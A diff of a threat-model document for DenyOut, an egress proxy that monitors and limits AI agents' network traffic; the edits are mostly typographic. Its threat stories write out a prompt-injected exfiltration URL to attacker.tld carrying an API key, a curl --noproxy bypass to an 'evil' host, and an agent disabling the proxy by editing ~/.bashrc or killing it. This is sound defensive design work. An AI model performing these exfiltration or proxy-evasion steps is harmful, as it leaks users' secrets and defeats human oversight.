@@ -1,8 +1,8 @@
-# D02 — Threat model
+# D02 - Threat model
 
 ## 1. Scope
 
-This threat model covers **DenyOut as an egress mediation layer** for AI agents on developer workstations and server workloads. It does not cover compromising the LLM weights, the user’s browser outside DenyOut, or physical access.
+This threat model covers **DenyOut as an egress mediation layer** for AI agents on developer workstations and server workloads. It does not cover compromising the LLM weights, the user's browser outside DenyOut, or physical access.
 
 ## 2. Assets
 
@@ -31,30 +31,30 @@ This threat model covers **DenyOut as an egress mediation layer** for AI agents 
 
 ```text
 ┌─────────────────────────────────────────────┐
-│  User / orchestrator (starts denyout)       │
+│ User / orchestrator (starts denyout) │
 └─────────────────────┬───────────────────────┘
-                      │ spawns
-                      ▼
+ │ spawns
+ ▼
 ┌─────────────────────────────────────────────┐
-│  DenyOut (policy + proxy + audit writer)    │  TRUSTED relative to agent
-│  - reads policy from disk / configmap       │
-│  - holds CA key (intercept)                 │
-│  - writes audit outside agent FS when possible │
+│ DenyOut (policy + proxy + audit writer) │ TRUSTED relative to agent
+│ - reads policy from disk / configmap │
+│ - holds CA key (intercept) │
+│ - writes audit outside agent FS when possible │
 └─────────────────────┬───────────────────────┘
-                      │ mediates
-                      ▼
+ │ mediates
+ ▼
 ┌─────────────────────────────────────────────┐
-│  Agent process tree (UNTRUSTED)             │
-│  - LLM, tools, shell, MCP, browser tool     │
+│ Agent process tree (UNTRUSTED) │
+│ - LLM, tools, shell, MCP, browser tool │
 └─────────────────────┬───────────────────────┘
-                      │ only via DenyOut (ideal)
-                      ▼
+ │ only via DenyOut (ideal)
+ ▼
 ┌─────────────────────────────────────────────┐
-│  External network / internal APIs           │
+│ External network / internal APIs │
 └─────────────────────────────────────────────┘
 ```
 
-**Assumption MVP desktop:** Agent is not actively malicious malware with root; it is a confused/steered process. Env-based proxy can be ignored by some binaries → residual risk (D10).
+**Assumption MVP desktop:** Agent is not actively malicious malware with root; it is a confused/steered process. Env-based proxy can be ignored by some binaries -> residual risk (D10).
 
 **Assumption server:** NetworkPolicy/firewall makes non-proxy egress impossible; then ignoring `HTTPS_PROXY` fails closed.
 
@@ -62,13 +62,13 @@ This threat model covers **DenyOut as an egress mediation layer** for AI agents 
 
 | Risk | DenyOut role |
 | --- | --- |
-| **R-20** answer/link/image exfil | **Primary** — block secret URLs; deny unknown hosts; stop auto-fetch to attacker |
-| **R-01** injection steering tools | **Partial** — limits blast radius of network tools |
-| **R-04** secrets in answers | **Partial** — if secret appears in outbound URL/headers |
-| **R-09** excessive agency | **Partial** — outbound side only |
-| **R-11** unexpected network from code | **Partial** — if traffic uses proxy / is fenced |
-| **R-16** runaway agent | **Partial** — rate limits + kill switch |
-| **R-25** cost explosion | **Partial** — outbound call budgets |
+| **R-20** answer/link/image exfil | **Primary** - block secret URLs; deny unknown hosts; stop auto-fetch to attacker |
+| **R-01** injection steering tools | **Partial** - limits blast radius of network tools |
+| **R-04** secrets in answers | **Partial** - if secret appears in outbound URL/headers |
+| **R-09** excessive agency | **Partial** - outbound side only |
+| **R-11** unexpected network from code | **Partial** - if traffic uses proxy / is fenced |
+| **R-16** runaway agent | **Partial** - rate limits + kill switch |
+| **R-25** cost explosion | **Partial** - outbound call budgets |
 
 Not in scope as primary: R-05 tenancy, R-19 training poison, R-26 deletion, etc.
 
@@ -76,20 +76,20 @@ Not in scope as primary: R-05 tenancy, R-19 training poison, R-26 deletion, etc.
 
 ### T-EXFIL-URL (R-20)
 
-**Story:** Injected doc tells agent to “verify” by loading  
+**Story:** Injected doc tells agent to "verify" by loading 
 `https://attacker.tld/c.png?k=<API_KEY>`.
 
-**DenyOut:**  
-- Host not on allowlist → deny in `enforce`.  
-- Even if host allowed (e.g. open CDN mistake), secret scanner on query → deny.  
+**DenyOut:** 
+- Host not on allowlist -> deny in `enforce`. 
+- Even if host allowed (e.g. open CDN mistake), secret scanner on query -> deny. 
 - Audit reason: `host_not_allowed` or `secret_in_url`.
 
 ### T-EXFIL-IMG-AUTOLOAD
 
 **Story:** Chat UI or ticket renderer loads markdown image without click.
 
-**DenyOut:** Same as HTTP GET through proxy if the rendering process is under DenyOut.  
-**Gap:** If the **human’s browser** outside DenyOut renders the image, DenyOut does not see it. Mitigation: product guidance + optional browser extension later; for agents, wrap the **browser tool** process.
+**DenyOut:** Same as HTTP GET through proxy if the rendering process is under DenyOut. 
+**Gap:** If the **human's browser** outside DenyOut renders the image, DenyOut does not see it. Mitigation: product guidance + optional browser extension later; for agents, wrap the **browser tool** process.
 
 ### T-EXFIL-DNS
 
@@ -101,20 +101,20 @@ Not in scope as primary: R-05 tenancy, R-19 training poison, R-26 deletion, etc.
 
 **Story:** Allowlist includes `api.telegram.org` or a paste host; agent POSTs secret in body.
 
-**DenyOut:** With **passthrough** TLS, body invisible → gap. With **intercept** + body scanner / DLP rules → best-effort deny. Policy SHOULD prefer narrow path/method allowlists (phase 2).
+**DenyOut:** With **passthrough** TLS, body invisible -> gap. With **intercept** + body scanner / DLP rules -> best-effort deny. Policy SHOULD prefer narrow path/method allowlists (phase 2).
 
 ### T-PROXY-BYPASS
 
 **Story:** Agent runs `curl --noproxy '*' https://evil` or raw socket.
 
-**Desktop MVP:** Often succeeds unless OS sandbox. Spec **MUST** document.  
-**Server:** NetworkPolicy deny → connection fails. Acceptance test mandatory (D14).
+**Desktop MVP:** Often succeeds unless OS sandbox. Spec **MUST** document. 
+**Server:** NetworkPolicy deny -> connection fails. Acceptance test mandatory (D14).
 
 ### T-DISABLE-DENYOUT
 
 **Story:** Agent rewrites `~/.bashrc` or kills proxy.
 
-**Desktop:** User-equivalent agent can often do this; DenyOut is seatbelt not rootkit.  
+**Desktop:** User-equivalent agent can often do this; DenyOut is seatbelt not rootkit. 
 **Server:** Agent has no permission to edit ConfigMap / kill sibling with PDB + non-shared service account.
 
 ### T-POLICY-WEAKEN
@@ -147,17 +147,17 @@ Not in scope as primary: R-05 tenancy, R-19 training poison, R-26 deletion, etc.
 | --- | --- | --- |
 | Spoofing | Fake upstream | TLS to real hosts; optional cert pinning later |
 | Tampering | Agent edits audit log | Write audit outside agent mount |
-| Repudiation | “We didn’t call evil” | Signed/hash-chained audit (phase 2); MVP structured logs |
+| Repudiation | "We didn't call evil" | Signed/hash-chained audit (phase 2); MVP structured logs |
 | Info disclosure | Secret in URL | Scanners; deny |
 | DoS | Agent floods egress | Rate limits; connection caps |
-| Elevation | Agent becomes broader network user | Allowlist + no standing “*”; ask mode |
+| Elevation | Agent becomes broader network user | Allowlist + no standing "*"; ask mode |
 
 ## 8. Residual risks (accepted for MVP)
 
-1. Desktop proxy-env bypass without OS fence.  
-2. Exfil to allowed host via encrypted body without intercept DLP.  
-3. Human browser rendering agent output outside DenyOut.  
-4. User explicitly allowlisting attacker infrastructure.  
+1. Desktop proxy-env bypass without OS fence. 
+2. Exfil to allowed host via encrypted body without intercept DLP. 
+3. Human browser rendering agent output outside DenyOut. 
+4. User explicitly allowlisting attacker infrastructure. 
 5. Compromise of the DenyOut process itself (= game over for egress confidentiality/integrity).
 
 ## 9. Security objectives (CIA for egress path)
